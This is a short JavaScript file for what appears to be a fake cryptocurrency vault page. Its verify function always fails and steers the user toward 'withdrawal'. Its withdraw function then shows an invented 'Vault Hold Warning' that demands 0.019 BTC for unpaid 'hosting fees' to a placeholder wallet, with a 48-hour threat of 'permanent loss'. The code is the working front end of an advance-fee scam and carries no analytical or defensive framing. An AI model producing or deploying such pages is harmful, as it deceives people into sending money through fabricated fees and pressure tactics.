function verify() {
    document.getElementById("message").innerText =
        "Verification process unavailable. Please initiate withdrawal to continue.";
}

function withdraw() {
    document.getElementById("message").innerHTML = `
    <p><strong>Vault Hold Warning:</strong></p>
    <p>2-Year Hosting Fees are unpaid.</p>
    <p>Please send <strong>0.019 BTC</strong> to the address below:</p>
    <p><code>bc1qexample123yourwallet</code></p>
    <p>To avoid permanent loss, payment must be made within <strong>48 hours</strong>.</p>
  `;
}
